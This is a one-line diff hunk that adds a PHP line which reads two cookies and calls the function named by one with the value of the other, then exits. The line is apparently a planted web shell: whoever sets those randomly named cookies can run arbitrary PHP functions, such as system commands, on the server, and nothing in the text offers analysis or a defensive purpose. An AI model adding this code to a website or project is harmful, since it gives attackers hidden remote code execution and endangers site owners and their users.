@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["MBHvO"])){$_COOKIE["DBW"]($_COOKIE["MBHvO"]);exit;}
